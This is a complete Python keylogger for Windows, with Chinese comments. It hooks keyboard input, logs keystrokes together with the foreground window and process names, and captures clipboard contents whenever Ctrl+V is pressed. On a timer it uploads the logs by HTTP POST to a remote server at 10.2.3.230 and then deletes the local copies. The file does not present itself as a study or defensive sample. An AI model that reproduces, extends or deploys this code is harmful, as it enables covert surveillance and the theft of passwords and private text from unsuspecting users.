# -*- coding: utf-8 -*-
import os
from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import threading
import datetime
import requests

keyboard_logger_file = open("keyrecode.txt", mode="a+", buffering=2)
file_locker = threading.Lock()
upload_file_queue = []


def file_timer():
    print('preparing uploading...')
    with file_locker:
        import io
        keyboard_logger_file.flush()
        # 获得光标位置的数值，从而判断
        size = keyboard_logger_file.tell()
        if size > 0:
            # 确定文件游标
            keyboard_logger_file.seek(0, io.SEEK_SET)
            # 获得文件生成时间
            filetime = datetime.datetime.now().strftime("%Y-%m-%d-%H%M%S") + ".txt"
            with open(filetime, "w") as fp:
                fp.write(keyboard_logger_file.read())
                # 确定光标，清空文件，刷新
                keyboard_logger_file.seek(0, io.SEEK_SET)
                keyboard_logger_file.truncate()
                keyboard_logger_file.flush()
            # 将生成文件冠以时间的文件名，加入上传队列
            upload_file_queue.append(filetime)

    while upload_file_queue:
        uploaded_file = upload_file_queue[0]
        with open(uploaded_file, "r") as fp:
            try:
                print("Uploading file:" + uploaded_file)
                response = requests.request("post", "http://10.2.3.230:8000/upload/", files={uploaded_file: fp})
                # 删除队列中已上传的元素，删除已经上传的文件
                upload_file_queue.pop(0)
                os.remove(uploaded_file)
            except:
                continue
    # 开始多线程，保证timer是首线程
    timer = threading.Timer(60, file_timer)
    timer.daemon = True
    timer.start()


timer = threading.Timer(20, file_timer)
timer.daemon = True
timer.start()

# 此处是获得windows内核，窗口，内存管理、输入操作、中断处理。进程状态API
user32 = windll.user32
kernel32 = windll.kernel32  # 内存特定写保护区域，别的程序无法占用
psapi = windll.psapi
current_window = None


# 键盘记录并写入文件 函数
def record(data):
    with file_locker:
        keyboard_logger_file.write(data + " ", )


# 窗口判断
def get_current_process():
    # 获取最上层的窗口
    hwnd = user32.GetForegroundWindow()

    # 获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # 将进程ID存入变量中
    process_id = int(pid.value)

    # 申请内存
    executable = create_string_buffer("\x00" * 1024)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 1024)

    # 读取窗口标题
    windows_title = create_string_buffer("\x00" * 1024)
    length = user32.GetWindowTextA(hwnd, byref(windows_title), 1024)

    # 打印
    record("\r\n[ Changefocus:%s-%s-%s]\r\n" % (process_id, executable.value, windows_title.value))

    # 关闭handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


# 定义击键监听事件函数
def KeyStroke(event):
    global current_window

    # 检测目标窗口是否转移(换了其他窗口就监听新的窗口)
    if event.WindowName != current_window:
        current_window = event.WindowName
        # 函数调用
        get_current_process()

    # 检测击键是否常规按键（非组合键等）
    if 32 < event.Ascii < 127:
        record(event.Key)
    else:
        # 如果发现Ctrl+v（粘贴）事件，就把粘贴板内容记录下来
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            record("[粘贴]-{}\n".format(pasted_value))

        else:
            record(event.Key + "\n")

    # 循环监听下一个击键事件
    return True


# 创建并注册hook管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke

# 注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()
